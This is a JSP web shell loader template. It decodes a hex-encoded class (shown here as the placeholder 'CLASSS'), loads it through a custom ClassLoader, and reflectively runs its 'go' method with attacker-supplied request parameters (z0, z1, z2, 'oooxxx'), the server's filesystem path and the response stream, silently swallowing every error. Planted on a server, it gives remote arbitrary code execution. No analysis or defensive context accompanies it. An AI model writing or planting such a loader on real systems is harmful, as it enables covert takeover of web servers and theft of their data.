<%@page import="java.io.*,java.lang.reflect.*" %>
<%!
    class MyClassLoader extends ClassLoader {

        private byte[]  data ;

        public void setData(byte[] data){
            this.data = data;
        }

        public Class findClass(String name) {
            Class result = null;

            try {
                return findSystemClass(name);
            } catch (Exception e) {
            }

            byte[] b = data;
            result =  defineClass(name, b, 0, b.length,null);
            return result;
        }
    }

    public static byte[] hex2byte(byte[] b) {
        if ((b.length % 2) != 0) {
            throw new IllegalArgumentException("long error");
        }
        byte[] b2 = new byte[b.length / 2];
        for (int n = 0; n < b.length; n += 2) {
            String item = new String(b, n, 2);
            b2[n / 2] = (byte) Integer.parseInt(item, 16);
        }
        b = null;
        return b2;
    }

%>
<%

    try {
        String a = "CLASSS";
        byte[] bytes = hex2byte(a.getBytes() );
        MyClassLoader  loader = new MyClassLoader();
        loader.setData(bytes);
        Class c = loader.findClass("Ch");
        String cs = request.getParameter("z0");
        response.setContentType("text/html");
        //response.setCharacterEncoding(cs);
        String par1 = request.getParameter("z1");
        String par2 = request.getParameter("z2");
        String par3 = request.getParameter("oooxxx");
        String realpath = request.getSession().getServletContext().getRealPath("/");
        Method go = c.getMethod("go", new Class[]{String.class ,String.class,String.class,String.class,String.class,OutputStream.class } );
        go.invoke(null,new Object[]{cs, par1, par2, par3,realpath,response.getOutputStream()});
        out.clear();
        out = pageContext.pushBody();
    } catch (Exception e) {

    }
%>
